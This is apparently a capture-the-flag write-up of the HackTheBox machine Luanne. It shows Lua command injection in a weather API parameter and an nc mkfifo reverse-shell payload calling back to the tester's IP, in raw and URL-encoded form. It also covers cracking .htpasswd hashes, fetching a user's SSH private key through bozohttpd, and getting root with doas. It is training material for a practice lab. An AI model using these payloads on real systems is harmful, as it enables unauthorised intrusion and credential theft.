## Information Gathering

In order to start the VM, we start with the Information gathering phase. Let's begin with a Nmap Scan.

### Nmap Output

<details>

</details>

From the output shown above, we can see that the machine is a Linux machine and I added `luanne.htb` to the `/etc/hosts` file. As this is a Linux machine and it only has 3 open ports, I started by doing some web enumeration for nginx. Navigating to `/robots.txt` provided me with the following output:

<p class="imgMiddle">
<img src="/assets/img/ChallengeVMs/Luanne/img1.png"  style="width: 65%" />
</p>

### Basic Web Enumeration

Okay, I now had an additional directory, but navigating to the directory still returned an 404 error. I decided to use this directory as the base for Gobuster enumeration, the output of which is shown below:

<details>

```bat
vagrant@ko:~/Desktop/HackTheBox/Luanne$ sudo gobuster dir -u http://10.10.10.218/weather/  -w /usr/share/seclists/Discovery/Web-Content/raft-small-directories.txt

```

</details>

Navigating to the `/forecast` directory returned the following JSON page:

<p class="imgMiddle">
<img src="/assets/img/ChallengeVMs/Luanne/img2.png"  style="width: 80%" />
</p>

I attempted to list the cities by changing the URL to <http://10.10.10.218/weather/forecast/?city=list>. This URL returned the available cities to the user:

<p class="imgMiddle">
<img src="/assets/img/ChallengeVMs/Luanne/img3.png"  style="width: 80%" />
</p>

I started by performing some basic injection techniques which you could do with a special characters list and a fuzzing program such as ffuf. Adding a single quotation mark `(')` to the list command threw a Lua error:

```html
<br>Lua error: /usr/local/webapi/weather.lua:49: attempt to call a nil value
```

This looked promising, I most likely had a way to exploit this code via Lua code execution. Lua makes use of `os.execute` in order to execute system commands, so I just needed to determine the correct sequence of escape characters. After a bit of playing around, I managed to retrieve the user's id with the following payload:

```lua
/weather/forecast/?city=list')%20os.execute('id')--
```

The output of which is shown below:

<p class="imgMiddle">
<img src="/assets/img/ChallengeVMs/Luanne/img4.png"  style="width: 65%" />
</p>

Alright! Since I had basic command execution, I needed to change the payload to a reverse shell. I attempted to use a few Lua payloads from PayloadAllTheThings, but none of them seemed to work. I changed tactics and created a basic `sh` reverse shell since bash did not exist on the machine:

```bash
'rm /tmp/fa;mkfifo /tmp/fa;cat /tmp/fa|/bin/sh -i 2>&1|nc 10.10.14.82 1234 >/tmp/fa;'
```

I then ensured that it was URL encoded and executed the command via the `forecast` URL:

```lua
/weather/forecast/?city=list')%20os.execute(%27rm+%2ftmp%2ffa%3bmkfifo+%2ftmp%2ffa%3bcat+%2ftmp%2ffa%7c%2fbin%2fsh+-i+2>%261%7cnc+10.10.14.82+1234+>%2ftmp%2ffa%3b%27)--
```

</p>

## Lateral Movement using httpd
Now that I had access to the machine, I began by performing some basic enumeration:

<details>

```bat
$ echo " ";echo "uname -a:";uname -a;echo " ";echo "hostname:";hostname;echo " ";echo "id";id;echo " ";echo "ifconfig:";/sbin/ifconfig -a; echo " ";echo "groups:";groups;
 
uname -a:

```
</details>

The directory that I landed in contained a `.htpasswd` file with the following information:

```bat
$ cat .htpasswd
webapi_user:$1$vVoNCsOl$lMtBS6GL2upDbR4Owhzyc0
```

I added the hash to a file in order to crack it. I then ran the file through JohnTheRipper with the Rockyou wordlist which managed to crack the password:

```bat
vagrant@ko:~/Desktop/HackTheBox/Luanne$ john hashes.txt --show
webapi_user:iamthebest

1 password hash cracked, 0 left
```

Using the credentials, I went back to the web application and logged in:

<p class="imgMiddle">
<img src="/assets/img/ChallengeVMs/Luanne/img6.png"  style="width: 65%" />
</p>

Unfortunately, this didn't provide me with any additional information and I was not able to SSH in to the host using the credentials. I continued searching through the host and started with some additional enumeration through the use of linpeas. There were three potential users on the machine which I identified through the `/etc/passwd` file -- root, toor, and r.michaels. I decided to use the password to attempt to log in with any of those accounts, however none of them allowed me to access the host. Additionally, there seemed to be a few interesting files which were writable by my user or the `_httpd` group. These directories are provided below:

* `/var/log/supervisord`
* `/var/supervisord/log`
* `/var/supervisord/run`

The linpeas enumeration also identified a username within the `supervisord.conf` file:

```bat
[+] Finding 'username' string inside key folders (limit 70)
/etc/supervisord.conf:username = user
```

I decided to look in to the `supervisord.conf` file and managed to find some additional credentials:

<p class="imgMiddle">
<img src="/assets/img/ChallengeVMs/Luanne/img8.png"  style="width: 80%" />
</p>

If you recall from the initial nmap scan, there was an additional port open: 9001. Navigating to this port and using the credentials, I was able to log in to the application:

<p class="imgMiddle">
<img src="/assets/img/ChallengeVMs/Luanne/img9.png"  style="width: 80%" />
</p>

I didn't find any method of exploiting this software and since the software didn't allow me to tail the log file, I navigated to `/var/supervisord/log` and opened the log file through the host. The file itself was massive but there were a few reoccurring functions which are shown below:

<p class="imgMiddle">
<img src="/assets/img/ChallengeVMs/Luanne/img10.png"  style="width: 80%" />
</p>

### Exploiting bozohttpd

I did a quick search for `/libexec/httpd` and found that it was a simple NetBSD HTTP server: <https://wiki.netbsd.org/tutorials/how_to_setup_a_webserver/>.

> bozohttpd is a small and secure HTTP 1.1 server shipped with NetBSD(/usr/libexec/httpd) by default. It's very simple and there isn't even a configuration file. But it only provides the most basic features.

As shown above, the `r.michaels` user was running `/usr/libexec/httpd` with commands. A breakdown of the commands from the ManPages is shown below: <https://man.netbsd.org/NetBSD-6.0.1/httpd.8>.

* `-X`: Enables directory indexing
* `-u`: Enables the transformation of Uniform Resource Locators of the form /~user/ into the directory ~user/public_html.
* `-s`: Forces logging to be set to stderr always.
* `-i`: Causes address to use used as the address to bind daemon mode. If otherwise unspecified, the address used to bind is derived from the myname, which defaults to the name returned by gethostname(3).  Only the last -i option is used.  
* `-P`: Causes httpd to create a pid file in pidfile when run in daemon mode with the -b option.
* `-U`: Causes httpd to switch to the user and the groups of username after initialization. This option, like -t above, causes httpd to clear the environment unless the -e option is given.
* `-b`: Enables daemon mode, where httpd detaches from the current terminal, running in the background and servicing HTTP requests.

Alright, based on that information, it seems as if a web server is being served on port 3001: 

```bat
/usr/libexec/httpd -u -X -s -i 127.0.0.1 -I 3001 -L weather /home/r.michaels/devel/webapi/weather.lua -P /var/run/httpd_devel.pid -U r.michaels -b /home/r.michaels/devel/www
```

Using this information, I created a curl command which abuses the `-u` parameter and replaces the weather resource with an item that I want to serve:

```bat
curl --user webapi_user:iamthebest http://127.0.0.1:3001/~r.michaels/id_rsa
``` 

In essence, this command is authenticating to the application that is being hosted and from there it is serving a new file which, in this case, retrieves the user's private key.

```

</details>

I used the private key above to log in to the web application via SSH:

<p class="imgMiddle">
<img src="/assets/img/ChallengeVMs/Luanne/img11.png"  style="width: 80%" />
</p>

## Privilege Escalation using r.michaels

With access to the `r.michaels` user, I started doing some basic reconnaissance on the host and found a `backups` directory which contained `devel_backup-2020-09-16.tar.gz.enc`. In order to extract the contents, I decrypted the file and then extracted the contents of the folder using the following commands:

```
netpgp --decrypt --output=/tmp/devel.tar.gz
tar zxvf /tmp/devel.tar.gz
```

<p class="imgMiddle">
<img src="/assets/img/ChallengeVMs/Luanne/img12.png"  style="width: 80%" />
</p>

This worked because the home directory contained the `.gnupg` keys. Looking into the backups directory, it contained another `.htpasswd` file which had a different hash to the initial one:

```bat
webapi_user:$1$6xc7I/LW$WuSQCS6n3yXsjPMSmwHDu.
```
I added the hash to a file in order to crack it. I ran the file through JohnTheRipper with the Rockyou wordlist which managed to crack the password:

```bat
vagrant@ko:~/Desktop/HackTheBox/Luanne$ john hashes.txt --show
webapi_user:littlebear

1 password hash cracked, 0 left
```

Since it's ksh and the `su` command wasn't available, I authenticated to the root user using `doas`:

<p class="imgMiddle">
<img src="/assets/img/ChallengeVMs/Luanne/img13.png"  style="width: 80%" />
</p>

That's the box! I hope that the walkthrough helped someone. If you found it interesting at all or if you think it was missing some crucial information, please reach out to me so that I can continue improving as I create more posts.
